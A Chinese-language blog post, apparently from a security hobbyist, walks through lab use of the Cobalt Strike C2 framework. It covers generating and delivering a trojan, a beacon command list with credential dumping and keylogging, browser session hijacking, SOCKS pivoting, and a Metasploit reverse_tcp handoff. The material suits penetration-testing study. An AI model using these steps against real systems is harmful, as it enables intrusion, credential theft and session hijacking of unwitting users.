@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>Cobalt Strike主机上线及其他功能测试 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CobaltStrike,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>Cobalt Strike主机上线及其他功能测试</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-04-27
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike是一款很好用的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等多种功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具， 该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节。 </p>
+<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><h3 id="团队服务器"><a href="#团队服务器" class="headerlink" title="团队服务器"></a>团队服务器</h3><p>在下载的Cobalt Strike 文件加中，有teamserver 和cobaltstrike.jar这两个文件，有的也有windows版的运行脚本(teamserver.bat)，这两个是团队服务器启动的关键文件，将这两个文件复制到服务器端，使用管理员权限运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver</span><br></pre></td></tr></table></figure>
+<p>启动后可以看到提示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line">&lt;host&gt; 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; 必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD] 可选参数 所有payload的终止时间</span><br></pre></td></tr></table></figure>
+<p>按照要求输入参数运行即可,启动的默认端口是50050，修改可以到teamserver文件中修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver xxx.xxx.xxx.xxx password</span><br></pre></td></tr></table></figure>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>windows下双击cobaltstrike.exe<br>linxu下打开终端，在软件文件中运行下面的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+<p>然后输入服务端ip和自己的密码登录</p>
+<h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><h3 id="创建Listeners"><a href="#创建Listeners" class="headerlink" title="创建Listeners"></a>创建Listeners</h3><p>点击Cobalt Strike -&gt;Listeners-&gt;add  添加监听器，这就和msf中的监听器一个概念，其中默认八种方式</p>
+<p><img src="/article/6ea27749/image-20200426203733783.png" alt="image-20200426203733783"></p>
+<p>这里只介绍几种不常见的监听方式</p>
+<h4 id="beacon-smb"><a href="#beacon-smb" class="headerlink" title="beacon_smb"></a>beacon_smb</h4><p> 这种上线方式走的是 SMB 协议, 正向连接, 目标机器必须开启 445 端口, 同时利用命名管道来执行命令, 对于那些在内网中无法出网的机器就特别好用. 但是并不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线. </p>
+<h4 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h4><p>Bind TCP Beacon 与 SMB Beacon 差不多, 但它可以直接生成载荷在目标机器上执行.</p>
+<h4 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h4><p>指定反向连接的 Listen Host 和 Listen Port. 一般默认即可, 除非机器有多个网卡. 这里意为将该机器作为跳板机, 让上线 Beacon 去连接这台机器, 然后与 C2 通信. 因而内网中每台机器都可以创建一个 Reverse TCP Beacon Listener, 所以溯源时也会有难度.<br>Reverse TCP Beacon 只能通过 Stageless Payload 上线.</p>
+<p>这里演示使用reverse_http监听，其中host为本机IP，端口为未被占用的端口</p>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p> Attacks-&gt;Packages-&gt; 选择相应的木马文件，这里选择windows executable ，之后选择监听器，选择输出类型即可</p>
+<p><img src="/article/6ea27749/image-20200426212019965.png" alt="image-20200426212019965"></p>
+<p>将木马发送给靶机，运行之后， 就可以看到主机上线了<img src="/article/6ea27749/image-20200426212833914.png" alt="image-20200426212833914"></p>
+<p>之后右键点击 进入beacon，即可进入到命令行控制模式，输入help可以看到帮助信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   通过TCP连接到Beacon</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">    execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    exit                      退出beacon</span><br><span class="line">    getprivs                  对当前令牌启用系统权限</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    help                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    jobs                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    kill                      结束进程</span><br><span class="line">    link                      通过命名管道连接到Beacon</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      给当前目标机器备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      为生成的post-ex任务设置父PID</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    使用服务在主机上生成会话</span><br><span class="line">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    pwd                       当前目录位置</span><br><span class="line">    reg                       查询注册表</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      在另一个PID下执行程序</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     生成一个会话 </span><br><span class="line">    spawnas                   以其他用户身份生成会话</span><br><span class="line">    spawnto                   将可执行程序注入进程</span><br><span class="line">    spawnu                    在另一个PID下生成会话</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    断开与Beacon的连接</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>
+<p>输入help  命令，就可以输出具体命令的参数<br>需要注意的是sleep参数，这是和靶机进行交互的间隔时间，默认是60s，实验中可以设置成0</p>
+<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><h3 id="Browser-Pivot"><a href="#Browser-Pivot" class="headerlink" title="Browser Pivot"></a>Browser Pivot</h3><blockquote>
+<p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。 </p>
+</blockquote>
+<p>这里模拟靶机登录贴吧，进行访问</p>
+<p><img src="/article/6ea27749/image-20200426213814601.png" alt="image-20200426213814601"></p>
+<p>需要执行ps命令，查看用户的进程，或者右键点击目标中的进程列表查看，找到ieplore.exe的进程，这里可能会 存在多个相同的进程，因为 IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。<br>找到相应的PID之后运行<br><strong>注意:</strong>必须要使用 x86 架构的 IE 浏览器<strong>子进程</strong>来注入浏览器跳板 DLL，因为只有注入了与打开的 IE 选项卡关联的进程才能继承会话状态（通过身份认证）。<br>但具体是哪个标签页进程无关紧要，因为子选项卡共享会话状态。Cobalt Strike 将在它认为你可以注入的进程旁边显示一个勾选框。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 找到的PID x86</span><br></pre></td></tr></table></figure>
+<p>或者是直接右键，选择浏览器代理</p>
+<p><img src="/article/6ea27749/image-20200426213925323.png" alt="image-20200426213925323"></p>
+<p>选择开始后可以看到，代理成功</p>
+<p><img src="/article/6ea27749/image-20200426214731968.png" alt="image-20200426214731968"></p>
+<p>之后到浏览器中设置代理 192.168.233.128:35707,访问靶机访问的网页，就可以直接进入登录后的页面了，这里可能是证书的问题，图片显示不正常</p>
+<p><img src="/article/6ea27749/image-20200426215656181.png" alt="image-20200426215656181"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserpivot stop  #关闭代理</span><br></pre></td></tr></table></figure>
+<h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scoks 6666</span><br><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+<p>将代理加入进去</p>
+<p><img src="/article/6ea27749/image-20200426220522584.png" alt="image-20200426220522584"></p>
+<p>然后基于可以使用proxychains代理扫描内网主机 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Sn 192.168.233.0/24</span><br></pre></td></tr></table></figure>
+<p>我们还可以通过隧道将整个msf带进目标内网，点击View-&gt;Proxy Pivots，选择Socks4a Proxy,点击Tunnel:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:192.168.233.133:6666</span><br></pre></td></tr></table></figure>
+<p>打开msf对内网进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks stop	#关闭socks</span><br></pre></td></tr></table></figure>
+<h3 id="桌面控制"><a href="#桌面控制" class="headerlink" title="桌面控制"></a>桌面控制</h3><p>首先来看一下desktop命令的参数<br><img src="/article/6ea27749/image-20200427091811240.png" alt="image-20200427091811240"></p>
+<p>当通过图形界面选择桌面控制无法进入时，可以通过命令行，将桌面控制工具注入到exlporer.exe进程中，通过这个回来的会话来运行桌面控制<img src="/article/6ea27749/image-20200427100055350.png" alt="image-20200427100055350"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desktop 3912 x64 low</span><br></pre></td></tr></table></figure>
+<p><img src="/article/6ea27749/image-20200427100149980.png" alt="image-20200427100149980"></p>
+<p>可以看到成功执行了，连接桌面控制后为了防止误触，read only 是默认按下的，需要控制时，可以打开</p>
+<h3 id="Cabalt-Strike-和-MSF-联动"><a href="#Cabalt-Strike-和-MSF-联动" class="headerlink" title="Cabalt Strike 和 MSF 联动"></a>Cabalt Strike 和 MSF 联动</h3><p>在之前连接的基础上，首先获取用户uid看一下， 然后建立socks连接<img src="/article/6ea27749/image-20200427101521721.png" alt="image-20200427101521721"></p>
+<p> 然后，通过 <code>View</code> → <code>Proxy Pivots</code>，复制生成的 MSF 代理链接。 <img src="/article/6ea27749/image-20200427101624557.png" alt="image-20200427101624557"></p>
+<p>使用msf运行上面的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:8888 			#走代理	</span><br><span class="line">setg ReverseAllowProxy true					#允许双向连接</span><br><span class="line"><span class="meta">#</span><span class="bash">然后就可以进行其他操作了</span></span><br></pre></td></tr></table></figure>
+<h3 id="CS与MSF会话互传"><a href="#CS与MSF会话互传" class="headerlink" title="CS与MSF会话互传"></a>CS与MSF会话互传</h3><p> 当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp #不要用x64的payload</span><br><span class="line">set lhost 192.168.233.128</span><br><span class="line">set lport 2323</span><br><span class="line">run -j</span><br></pre></td></tr></table></figure>
+<p><img src="/article/6ea27749/image-20200427102811254.png" alt="image-20200427102811254"></p>
+<p>然后在CS中新建 windows/foreign/reverse_tcp的Listeners，端口填写msf监听的端口</p>
+<p><img src="/article/6ea27749/image-20200427103022074.png" alt="image-20200427103022074"></p>
+<p>然后选中计算机，右键-&gt;Spawn：选择MSF的监听器,然后就可以看到msf中得到一个session了，然后就可以进行下面的操作了</p>
+<p><img src="/article/6ea27749/image-20200427103057920.png" alt="image-20200427103057920"></p>
+<h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p> <a href="https://blkwindy.top/2019/10/10/Cobalt Strike使用教程一/" target="_blank" rel="noopener">https://blkwindy.top/2019/10/10/Cobalt%20Strike%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E4%B8%80/</a><br> <a href="https://www.chabug.org/tools/755.html" target="_blank" rel="noopener">https://www.chabug.org/tools/755.html</a><br> <a href="http://blog.leanote.com/post/snowming/4e07af1cab60" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/4e07af1cab60</a> </p>
+<p> <a href="https://blkwindy.top/2019/10/10/Cobalt Strike使用教程一/" target="_blank" rel="noopener">https://blkwindy.top/2019/10/10/Cobalt%20Strike%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E4%B8%80/</a> </p>
+<p> <a href="https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html" target="_blank" rel="noopener">https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html</a> </p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/6ea27749.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/CobaltStrike/">
+              #CobaltStrike
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/bdd0a488.html" target="_self">通达OA文件上传和文件包含导致的RCE复现分析</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/23491f58.html" target="_self">Apache Shiro反序列化复现</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
